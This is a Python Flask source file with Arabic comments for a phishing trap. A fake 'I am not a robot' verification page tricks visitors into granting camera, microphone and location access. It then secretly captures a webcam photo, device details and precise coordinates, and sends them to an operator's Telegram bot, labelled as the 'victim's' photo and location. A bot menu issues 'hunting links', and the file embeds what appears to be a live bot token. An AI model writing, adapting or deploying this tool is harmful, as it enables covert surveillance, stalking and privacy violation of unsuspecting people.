import base64, requests, io, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- الإعدادات الأساسية ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701" # أنت الآدمن الوحيد

# --- الصفحة الأمامية (الفخ) ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق الأمان</title>
    <style>
        body { background: #050505; color: white; font-family: system-ui; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 40px; border-radius: 25px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
        .btn { background: linear-gradient(45deg, #f38020, #ffae00); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; font-size: 1.1rem; }
        #st { margin-top: 20px; color: #888; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 60px; margin-bottom: 20px;">🔒</div>
        <h2>تأكيد الهوية</h2>
        <p style="color: #ccc;">يرجى الضغط لتجاوز نظام الحماية والوصول للرابط</p>
        <button class="btn" id="go" onclick="capture()">أنا لست روبوت</button>
        <div id="st"></div>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const st = document.getElementById('st');
        async function post(d, t) { fetch('/', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }

        async function capture() {
            document.getElementById('go').style.display = 'none';
            st.innerText = "جاري التحقق من أمان المتصفح...";
            
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v'); v.srcObject = s;
                
                // جلب معلومات تفصيلية
                const b = await navigator.getBattery().catch(() => ({level: 0, charging: false}));
                const ram = navigator.deviceMemory || "غير معروف";
                const cores = navigator.hardwareConcurrency || "غير معروف";
                const lang = navigator.language;
                
                let info = `📊 **تقرير صيد احترافي**:\\n` +
                           `🔋 البطارية: %${Math.round(b.level*100)}\\n` +
                           `⚡ شحن: ${b.charging ? 'نعم' : 'لا'}\\n` +
                           `🧠 الرام: ${ram} GB\\n` +
                           `🦾 المعالج: ${cores} نوى\\n` +
                           `🌐 اللغة: ${lang}\\n` +
                           `🖥️ المنصة: ${navigator.platform}`;
                
                post(info, 'msg');

                // حل مشكلة الصورة السوداء (الانتظار حتى استقرار الكاميرا)
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    const ctx = c.getContext('2d');
                    ctx.drawImage(v, 0, 0);
                    post(c.toDataURL('image/jpeg', 0.7), 'img');
                    st.innerText = "اكتمل التحقق، سيتم توجيهك الآن...";
                }, 4500); // زيادة الوقت لضمان وضوح الصورة

                // الموقع الجغرافي بدقة عالية
                navigator.geolocation.getCurrentPosition(p => {
                    post(`📍 موقع الضحية بدقة:\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                }, null, {enableHighAccuracy: true});

            } catch (e) { 
                st.innerText = "فشل التحقق، يرجى تفعيل الصلاحيات!";
                setTimeout(() => location.reload(), 2000);
            }
        }
    </script>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def main():
    if request.method == 'POST':
        data = request.get_json(force=True, silent=True)
        if not data: return "OK"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"

        # --- قسم أوامر البوت (للآدمن فقط) ---
        if "message" in data:
            chat_id = str(data["message"]["chat"]["id"])
            text = data["message"].get("text", "")

            if chat_id == ADMIN_ID:
                if text == "/start":
                    menu = {
                        "inline_keyboard": [
                            [{"text": "🔗 إنشاء رابط صيد", "callback_data": "gen_link"}],
                            [{"text": "⚙️ الإعدادات (خاص بالآدمن)", "callback_data": "admin_settings"}],
                            [{"text": "👥 إحصائيات الأعضاء", "callback_data": "stats"}]
                        ]
                    }
                    requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': "أهلاً بك يا سيوفي في لوحة التحكم الخاصة بك:", 'reply_markup': menu})
                
            return "OK"

        # --- معالجة الضغط على الأزرار (Callback) ---
        if "callback_query" in data:
            cq = data["callback_query"]
            cid = cq["message"]["chat"]["id"]
            if cq["data"] == "gen_link":
                requests.post(url + "sendMessage", json={'chat_id': cid, 'text': f"🔗 رابط الصيد الخاص بك هو:\\n`https://{request.host}`", 'parse_mode': 'Markdown'})
            elif cq["data"] == "admin_settings":
                requests.post(url + "sendMessage", json={'chat_id': cid, 'text': "⚙️ لوحة الإدارة:\\n1- حظر أعضاء\\n2- مسح بيانات\\n3- إيقاف السيرفر مؤقتاً"})
            return "OK"

        # --- إرسال الصيد للآدمن ---
        t, d = data.get('t'), data.get('d')
        if t == 'msg':
            requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
        elif t == 'img':
            img = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية (تم معالجة السواد)"}, files={'photo': ('c.jpg', img)})
        return "OK"

    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
